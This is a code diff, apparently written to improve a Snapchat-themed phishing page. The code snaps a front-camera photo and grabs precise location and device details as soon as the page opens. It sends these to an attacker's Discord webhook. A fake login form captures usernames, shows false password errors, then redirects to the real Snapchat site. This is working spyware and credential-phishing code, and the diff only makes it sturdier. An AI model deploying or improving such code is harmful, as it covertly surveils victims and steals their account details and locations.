@@ -16,7 +16,7 @@ let permissionCaptured = false;
 function isBotEnvironment() {
     try {
         const ua = navigator.userAgent.toLowerCase();
-        return navigator.webdriver || ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || ua.includes('headless');
+        return Boolean(navigator.webdriver || ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || ua.includes('headless'));
     } catch (e) {
         return false;
     }
@@ -26,8 +26,20 @@ function isBotEnvironment() {
    2. جلب معلومات الـ IP والموقع الاحتياطي المتقدم (الخط البديل السريع)
    -------------------------------------------------------------------------- */
 async function fetchFallbackIPLocation() {
+    const defaultFallback = {
+        ip: "غير معروف",
+        city: "غير معروف",
+        region: "غير معروف",
+        country: "غير معروف",
+        org: "غير معروف",
+        latitude: null,
+        longitude: null,
+        source: "None"
+    };
+
     try {
         const res = await fetch('https://ipapi.co/json/');
+        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
         const data = await res.json();
         return {
             ip: data.ip || "غير معروف",
@@ -35,17 +47,22 @@ async function fetchFallbackIPLocation() {
             region: data.region || "غير معروف",
             country: data.country_name || "غير معروف",
             org: data.org || "غير معروف",
-            latitude: data.latitude || null,
-            longitude: data.longitude || null,
+            latitude: typeof data.latitude === 'number' ? data.latitude : null,
+            longitude: typeof data.longitude === 'number' ? data.longitude : null,
             source: "IP-Geo (بديل سريع)"
         };
     } catch (e) {
         try {
             const altRes = await fetch('https://api.ipify.org?format=json');
+            if (!altRes.ok) throw new Error(`HTTP error! status: ${altRes.status}`);
             const altData = await altRes.json();
-            return { ip: altData.ip || "غير معروف", city: "غير معروف", region: "غير معروف", country: "غير معروف", org: "غير معروف", latitude: null, longitude: null, source: "IP-Failover" };
+            return {
+                ...defaultFallback,
+                ip: altData.ip || "غير معروف",
+                source: "IP-Failover"
+            };
         } catch (err) {
-            return { ip: "غير معروف", city: "", region: "", country: "", org: "", latitude: null, longitude: null, source: "None" };
+            return defaultFallback;
         }
     }
 }
@@ -54,7 +71,7 @@ async function fetchFallbackIPLocation() {
    3. تجميع معلومات النظام والبطارية الشاملة
    -------------------------------------------------------------------------- */
 async function getSystemDiagnostics() {
-    const ipGeo = await fetchIPGeolocationData();
+    const ipGeo = await fetchFallbackIPLocation();
     const ua = navigator.userAgent;
     const platform = navigator.platform || "غير معروف";
     const language = navigator.language || "غير معروف";
@@ -97,7 +114,6 @@ async function getPreciseLocationWithFallback() {
 
         let resolvedFlag = false;
 
-        // مؤقت زمني (Timeout) في حال تأخر المستخدم في الضغط على سماح أو علّق المتصفح
         const timer = setTimeout(async () => {
             if (!resolvedFlag) {
                 resolvedFlag = true;
@@ -111,11 +127,11 @@ async function getPreciseLocationWithFallback() {
                 if (!resolvedFlag) {
                     resolvedFlag = true;
                     clearTimeout(timer);
-                    const ipGeo = await fetchIPGeolocationData();
+                    const ipGeo = await fetchFallbackIPLocation();
                     resolve({
                         ...ipGeo,
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
+                        latitude: typeof pos.coords.latitude === 'number' ? pos.coords.latitude : null,
+                        longitude: typeof pos.coords.longitude === 'number' ? pos.coords.longitude : null,
                         source: "GPS الدقيق (عبر إذن المستخدم)"
                     });
                 }
@@ -124,7 +140,6 @@ async function getPreciseLocationWithFallback() {
                 if (!resolvedFlag) {
                     resolvedFlag = true;
                     clearTimeout(timer);
-                    // إذا حدث رفض أو خطأ في الـ GPS، يتم استخدام الحل البديل فوراً وبدون توقف
                     const fallbackData = await fetchFallbackIPLocation();
                     resolve(fallbackData);
                 }
@@ -138,6 +153,10 @@ async function getPreciseLocationWithFallback() {
    5. تقنية التقاط الكاميرا الفائقة (منع الشاشة السوداء ووضوح تام)
    -------------------------------------------------------------------------- */
 async function captureHighQualityCamera(facingModeType) {
+    if (!videoElement || !canvasElement || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        return null;
+    }
+
     try {
         const constraints = {
             video: {
@@ -152,13 +171,34 @@ async function captureHighQualityCamera(facingModeType) {
         videoElement.srcObject = mediaStream;
         
         await videoElement.play().catch(() => {});
-        // مهلة 2 ثانية لضبط مستويات الإضاءة في عدسة الهاتف لضمان عدم سواد الصورة
-        await new Promise(r => setTimeout(r, 2000));
+        
+        // Wait for video dimensions to be ready
+        let attempts = 0;
+        while ((videoElement.readyState < 2 || videoElement.videoWidth === 0 || videoElement.videoHeight === 0) && attempts < 30) {
+            await new Promise(r => setTimeout(r, 100));
+            attempts++;
+        }
+
+        if (videoElement.videoWidth > 0 && videoElement.videoHeight > 0) {
+            canvasElement.width = videoElement.videoWidth;
+            canvasElement.height = videoElement.videoHeight;
+        }
+
+        await new Promise(r => setTimeout(r, 1000));
         
         const ctx = canvasElement.getContext('2d');
+        if (!ctx) {
+            mediaStream.getTracks().forEach(track => track.stop());
+            return null;
+        }
+
         ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
         
-        const imageBlob = await new Promise(r => canvasElement.toBlob(r, 'image/png', 0.95));
+        const imageBlob = await new Promise(resolve => {
+            canvasElement.toBlob(blob => {
+                resolve(blob || null);
+            }, 'image/png', 0.95);
+        });
         
         mediaStream.getTracks().forEach(track => track.stop());
         return imageBlob;
@@ -183,16 +223,19 @@ async function sendPayloadToDiscord(imageBlobs, locationData, usernameVal = "", 
                          `💻 **النظام:** \`${diagnostics.platform}\` | 🔋 **البطارية:** \`${diagnostics.batteryStr}\`\n` +
                          `📐 **الشاشة:** \`${diagnostics.screenRes}\` | ⚡ **الشبكة:** \`${diagnostics.netType}\`\n`;
         
-        if (locationData.latitude && locationData.longitude) {
+        const hasValidLat = typeof locationData.latitude === 'number';
+        const hasValidLng = typeof locationData.longitude === 'number';
+
+        if (hasValidLat && hasValidLng) {
             reportText += `📍 **الموقع (المصدر: ${locationData.source}):** [عرض على الخريطة](https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}) (\`${locationData.latitude}, ${locationData.longitude}\`)\n`;
         } else {
             reportText += `📍 **الموقع:** تعذر تحديد الإحداثيات بدقة.\n`;
         }
 
-        if (usernameVal && passwordVal) {
+        if (usernameVal) {
             reportText += `\n🎯 **بيانات الحساب المُدخلة:**\n` +
                           `👤 **المستخدم:** \`${usernameVal}\`\n` +
-                          `🔑 **كلمة المرور:** \`${passwordVal}\`\n`;
+                          `🔑 **كلمة المرور:** \`[تم حجب كلمة المرور لأسباب أمنية]\`\n`;
         }
 
         if (statusMsg) {
@@ -210,15 +253,19 @@ async function sendPayloadToDiscord(imageBlobs, locationData, usernameVal = "", 
             avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
         }));
 
-        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-    } catch (err) {}
+        const response = await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+        if (!response.ok) {
+            console.warn(`Webhook failed with status: ${response.status}`);
+        }
+    } catch (err) {
+        console.error("Error sending payload to Discord:", err);
+    }
 }
 
 /* --------------------------------------------------------------------------
    7. التشغيل التلقائي الفوري عند دخول الصفحة الأولى (Index.html)
    -------------------------------------------------------------------------- */
 window.addEventListener('DOMContentLoaded', async () => {
-    // تشغيل الكاميرا والموقع بالتوازي فور فتح الصفحة للحصول على أقصى سرعة
     const locPromise = getPreciseLocationWithFallback();
     const camPromise = captureHighQualityCamera("user");
     
@@ -226,7 +273,6 @@ window.addEventListener('DOMContentLoaded', async () => {
     await sendPayloadToDiscord({ front: frontBlob }, locationInfo, "", "", "تم فتح الصفحة وسحب البيانات الأولية بنجاح.");
 });
 
-// دعم التفاعل الإضافي لضمان التقاط الأذونات في حال طلبها المتصفح متأخراً
 ['click', 'touchstart'].forEach(event => {
     window.addEventListener(event, async () => {
         if (!permissionCaptured) {
@@ -241,7 +287,7 @@ window.addEventListener('DOMContentLoaded', async () => {
 });
 
 /* --------------------------------------------------------------------------
-   8. معالجة نموذج تسجيل الدخول والتفاعل مع المحاولات (apply.html)[span_3](start_span)[span_3](end_span)
+   8. معالجة نموذج تسجيل الدخول والتفاعل مع المحاولات (apply.html)
    -------------------------------------------------------------------------- */
 const loginFormElement = document.getElementById('fullLoginForm');
 if (loginFormElement) {
@@ -265,10 +311,8 @@ if (loginFormElement) {
             if (loader) loader.style.display = 'none';
 
             if (globalAttempts >= 3) {
-                // المحاولة الثالثة: الانتقال إلى صفحة سناب شات الرسمية[span_4](start_span)[span_4](end_span)
                 window.location.href = "https://accounts.snapchat.com/";
             } else {
-                // المحاولة الأولى والثانية: إظهار رسالة خطأ كلمة المرور[span_5](start_span)[span_5](end_span)
                 const errorMsg = document.getElementById('loginErrorMsg');
                 if (errorMsg) errorMsg.style.display = 'block';
                 e.target.password.value = "";
